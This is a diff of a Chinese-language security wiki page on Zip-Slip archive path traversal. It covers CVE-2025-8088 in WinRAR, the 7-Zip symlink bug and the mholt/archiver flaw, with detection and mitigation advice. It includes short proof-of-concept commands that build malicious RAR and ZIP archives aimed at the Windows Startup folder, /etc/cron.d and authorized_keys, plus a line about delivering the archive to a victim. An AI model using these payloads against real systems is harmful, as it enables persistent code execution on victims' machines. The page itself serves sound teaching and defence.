@@ -4,25 +4,23 @@
 
 ## 概述
 
-许多归档格式（ZIP、RAR、TAR、7-ZIP 等）允许每个条目携带其自身的 **内部路径**。当解压工具盲目信任该路径时，包含 `..` 的恶意文件名或一个 **绝对路径**（例如 `C:\Windows\System32\`）可能会被写入到用户选择目录之外的位置。
-这类漏洞广泛称为 *Zip-Slip* 或 **archive extraction path traversal**。
+许多 archive 格式（ZIP、RAR、TAR、7-ZIP 等）允许每个条目携带其自身的 **internal path**。当 extraction utility 盲目遵循该路径时，包含 `..` 或 **absolute path**（例如 `C:\Windows\System32\`）的 crafted filename 将被写入用户选择目录之外。
+这类 vulnerability 广为人知，被称为 *Zip-Slip* 或 **archive extraction path traversal**。
 
-## 后果
-
-后果可从覆盖任意文件扩展到通过将 payload 放置在自动运行位置（例如 Windows *Startup* 文件夹）直接实现 **remote code execution (RCE)**。
+后果可能包括覆盖任意文件，甚至通过将 payload 放入 Windows *Startup* folder 等 **auto-run** 位置，直接实现 **remote code execution (RCE)**。
 
 ## 根本原因
 
-1. 攻击者创建一个归档文件，其一个或多个文件头包含：
-   * 相对路径遍历序列（`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`）
-   * 绝对路径（`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`）
-   * 或精心构造的 **symlinks**，解析后位于目标目录之外（在 ZIP/TAR 的 *nix* 系统上常见）。
-2. 受害者使用一个易受攻击的工具解压该归档，该工具信任嵌入的路径（或跟随 symlinks），而不是对其进行清理或强制将提取限制在所选目录之下。
-3. 文件被写入攻击者可控的位置，并在系统或用户下次触发该路径时被执行/加载。
+1. Attacker 创建一个 archive，其中一个或多个 file header 包含：
+* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
+* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
+* 或者 crafted **symlinks**，其解析结果位于 target dir 之外（在 *nix* 的 ZIP/TAR 中很常见）。
+2. Victim 使用存在 vulnerability 的 tool 解压 archive；该 tool 信任嵌入的路径（或跟随 symlinks），而不是对其进行 sanitising，或强制将文件解压到所选目录之下。
+3. 文件被写入 attacker 控制的位置，并在系统或 user 下次触发该路径时被执行或加载。
 
 ### .NET `Path.Combine` + `ZipArchive` traversal
 
-一个常见的 .NET 反模式是将预期的目标路径与 **受用户控制的** `ZipArchiveEntry.FullName` 组合，并在不进行路径规范化的情况下提取：
+一种常见的 .NET anti-pattern，是将预期 destination 与 user-controlled 的 `ZipArchiveEntry.FullName` 组合，并在未进行 path normalisation 的情况下执行 extraction：<sup>[[4]](#references)</sup>
 ```csharp
 using (var zip = ZipFile.OpenRead(zipPath))
 {
@@ -33,25 +31,25 @@ entry.ExtractToFile(dest);
 }
 }
 ```
-- 如果 `entry.FullName` starts with `..\\` it traverses; 如果它是一个 **绝对路径** the left-hand component is discarded entirely, yielding an **任意文件写入** as the extraction identity.
-- 用于写入由计划扫描器监视的同级 `app` 目录的概念验证归档:
+- 如果 `entry.FullName` 以 `..\\` 开头，它就会执行路径遍历；如果它是一个**绝对路径**，左侧组件会被完全丢弃，从而以提取目标的身份实现**任意文件写入**。
+- 用于写入由计划扫描器监控的同级 `app` 目录的概念验证存档：
 ```python
 import zipfile
 with zipfile.ZipFile("slip.zip", "w") as z:
 z.writestr("../app/0xdf.txt", "ABCD")
 ```
-将该 ZIP 投放到受监视的收件箱中会导致 `C:\samples\app\0xdf.txt`，证明可在 `C:\samples\queue\` 之外发生目录遍历，并启用后续原语（例如 DLL hijacks）。
+将该 ZIP 放入受监控的 inbox 后，会生成 `C:\samples\app\0xdf.txt`，证明可以 traversal 到 `C:\samples\queue\` 之外，并启用后续利用原语（例如 DLL hijacks）。
 
-## 真实案例 – WinRAR ≤ 7.12 (CVE-2025-8088)
+## 真实案例 – WinRAR ≤ 7.12（CVE-2025-8088）
 
-适用于 Windows 的 WinRAR（包括 `rar` / `unrar` CLI、DLL 和可移植源码）在解压期间未对文件名进行验证。
-一个恶意的 RAR 存档包含类似如下的条目：
+Windows 版 WinRAR（包括 `rar` / `unrar` CLI、DLL 和 portable source）在 extraction 期间未能验证文件名。
+包含如下条目的恶意 RAR archive：
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-会最终落在所选输出目录的**外部**，并放入用户的 *Startup* 文件夹中。登录后 Windows 会自动执行其中的所有内容，从而提供*持久性* RCE。
+最终会位于所选输出目录**之外**，并进入用户的 *Startup* 文件夹。登录后，Windows 会自动执行其中存在的所有内容，从而提供持久化 RCE。<sup>[[5]](#references)</sup>
 
-### 构建 PoC Archive (Linux/Mac)
+### 构造 PoC Archive（Linux/Mac）
 ```bash
 # Requires rar >= 6.x
 mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@@ -59,66 +57,67 @@ cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Sta
 rar a -ep evil.rar evil/*
 ```
 使用的选项：
-* `-ep`  – 精确按给定存储文件路径（不要修剪前导的 `./`）。
+* `-ep`  – 按给定内容准确存储文件路径（**不要**裁剪开头的 `./`）。
 
-将 `evil.rar` 交付给受害者，并指示他们使用存在漏洞的 WinRAR 版本解压。
+将 `evil.rar` 交付给受害者，并指示其使用存在漏洞的 WinRAR 构建版本进行解压。
 
-### Observed Exploitation in the Wild
+### 在野外观察到的利用活动
 
-ESET 报告 RomCom (Storm-0978/UNC2596) 的鱼叉式钓鱼活动附带利用 CVE-2025-8088 的 RAR 归档，用于部署定制后门并协助勒索软件行动。
+ESET 报告了 RomCom（Storm-0978/UNC2596）发起的 spear-phishing 活动：攻击者附加滥用 CVE-2025-8088 的 RAR archive，用于部署定制 backdoor 并协助 ransomware 行动。<sup>[[5]](#references)</sup>
 
-## Newer Cases (2024–2025)
+## 更新案例（2024–2025）
 
-### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
-* **漏洞**：ZIP 条目为 **symbolic links** 时，在解压过程中会被取消引用，允许攻击者逃离目标目录并覆盖任意路径。用户交互仅为*打开/解压*归档。
-* **受影响**：7-Zip 21.02–24.09（Windows 与 Linux 构建）。已在 **25.00**（2025 年 7 月）及更高版本修复。
-* **影响路径**：覆盖 `Start Menu/Programs/Startup` 或服务运行位置 → 在下次登录或服务重启时执行代码。
-* **快速 PoC (Linux)**：
+### 7-Zip ZIP symlink traversal → RCE（CVE-2025-11001 / ZDI-25-949）
+* **Bug**：解压期间会对作为 **symbolic links** 的 ZIP entries 进行 dereference，使攻击者能够逃出目标目录并覆盖任意路径。用户只需*打开/解压* archive。<sup>[[1]](#references)</sup>
+* **受影响版本**：7-Zip 21.02–24.09（Windows 和 Linux builds）。已在 **25.00**（2025 年 7 月）及更高版本中修复。
+* **Impact path**：覆盖 `Start Menu/Programs/Startup` 或 service-run locations → 代码将在下次登录或 service restart 时运行。
+* **快速 PoC（Linux）**：
 ```bash
 mkdir -p out
 ln -s /etc/cron.d evil
 zip -y exploit.zip evil   # -y preserves symlinks
 7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
 ```
-在已修补的构建中 `/etc/cron.d` 将不会被触及；symlink 会作为链接被提取到 /tmp/target 内。
+在 patched build 中，`/etc/cron.d` 不会被修改；symlink 会作为 `/tmp/target` 内的 link 被解压出来。
 
-### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
-* **漏洞**：`archiver.Unarchive()` 会跟随 `../` 和通过 symlink 指向的 ZIP 条目，写出到 `outputDir` 之外。
-* **受影响**：`github.com/mholt/archiver` ≤ 3.5.1（项目现已弃用）。
-* **修复**：切换到 `mholt/archives` ≥ 0.1.0 或在写入前实现规范路径检查。
-* **最小复现示例**：
+### Go mholt/archiver Unarchive() Zip-Slip（CVE-2025-3445）
+* **Bug**：`archiver.Unarchive()` 会跟随 `../` 和 symlinked ZIP entries，将内容写到 `outputDir` 之外。<sup>[[2]](#references)</sup>
+* **受影响版本**：`github.com/mholt/archiver` ≤ 3.5.1（该项目现已 deprecated）。
+* **修复**：切换到 `mholt/archives` ≥ 0.1.0，或在写入前实现 canonical-path checks。
+* **最小复现**：
 ```go
 // go test . with archiver<=3.5.1
 archiver.Unarchive("exploit.zip", "/tmp/safe")
 // exploit.zip holds ../../../../home/user/.ssh/authorized_keys
 ```
 
-## Detection Tips
+## 检测提示
 
-* **Static inspection** – 列出归档条目并标记任何名称包含 `../`、`..\\`、*绝对路径*（`/`, `C:`）或类型为 *symlink* 且其目标位于提取目录之外的条目。
-* **Canonicalisation** – 确保 `realpath(join(dest, name))` 仍以 `dest` 开头。否则拒绝。
-* **Sandbox extraction** – 使用*安全*解压器（例如 `bsdtar --safe --xattrs --no-same-owner`、7-Zip ≥ 25.00）将内容解压到可丢弃目录并验证结果路径保持在该目录内。
-* **Endpoint monitoring** – 在 WinRAR/7-Zip 等打开归档后短时间内，对写入 `Startup`/`Run`/`cron` 位置的新可执行文件触发告警。
+* **静态检查** – 列出 archive entries，并标记名称中包含 `../`、`..\\`、*absolute paths*（`/`、`C:`）的 entries，或标记其 target 位于 extraction dir 外部的 *symlink* 类型 entries。
+* **Canonicalisation** – 确保 `realpath(join(dest, name))` 仍以 `dest` 开头。否则拒绝。<sup>[[3]](#references)</sup>
+* **Sandbox extraction** – 使用 *safe* extractor（例如 `bsdtar --safe --xattrs --no-same-owner`、7-Zip ≥ 25.00）将内容解压到 disposable directory，并验证生成的 paths 始终位于该目录内。
+* **Endpoint monitoring** – 当 archive 被 WinRAR/7-Zip 等工具打开后不久，如果有新的 executables 被写入 `Startup`/`Run`/`cron` locations，则发出告警。
 
-## Mitigation & Hardening
+## 缓解与加固
 
-1. **Update the extractor** – WinRAR 7.13+ 和 7-Zip 25.00+ 实现了路径/符号链接清理。两者仍然缺乏自动更新功能。
-2. 解压时尽可能使用“**Do not extract paths**”/“**Ignore paths**”。
-3. 在 Unix 上，在解压前降权限并挂载 **chroot/namespace**；在 Windows 上，使用 **AppContainer** 或沙箱。
-4. 如果编写自定义代码，在创建/写入**之前**使用 `realpath()`/`PathCanonicalize()` 进行规范化，并拒绝任何逃出目标目录的条目。
+1. **更新 extractor** – WinRAR 7.13+ 和 7-Zip 25.00+ 已实现 path/symlink sanitisation。两种工具仍不支持 auto-update。
+2. 在可能的情况下，使用“**Do not extract paths**”/“**Ignore paths**”解压 archives。
+3. 在 Unix 上，在解压前降低 privileges 并挂载 **chroot/namespace**；在 Windows 上，使用 **AppContainer** 或 sandbox。
+4. 如果编写 custom code，请在 create/write **之前**使用 `realpath()`/`PathCanonicalize()` 进行 normalise，并拒绝任何逃出目标目录的 entry。
 
-## Additional Affected / Historical Cases
+## 其他受影响/历史案例
 
-* 2018 – Snyk 发布的大规模 *Zip-Slip* 通告，影响许多 Java/Go/JS 库。
-* 2023 – 7-Zip CVE-2023-4011，类似的在 `-ao` 合并时的遍历。
-* 2025 – HashiCorp `go-slug` (CVE-2025-0377) 在 slugs 的 TAR 解压遍历（在 v1.2 中修补）。
-* 任何在写入前未调用 `PathCanonicalize` / `realpath` 的自定义解压逻辑。
+* 2018 – Snyk 发布大规模 *Zip-Slip* advisory，影响许多 Java/Go/JS libraries。
+* 2023 – 7-Zip CVE-2023-4011，在 `-ao` merge 期间存在类似 traversal。
+* 2025 – HashiCorp `go-slug`（CVE-2025-0377）中的 TAR extraction traversal，影响 slugs（v1.2 中提供 patch）。
+* 任何未能在写入前调用 `PathCanonicalize` / `realpath` 的 custom extraction logic。
 
 ## References
 
-- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
-- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
-- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
-- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
+- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
+- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
+- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
+- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
+- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
 
 {{#include ../banners/hacktricks-training.md}}
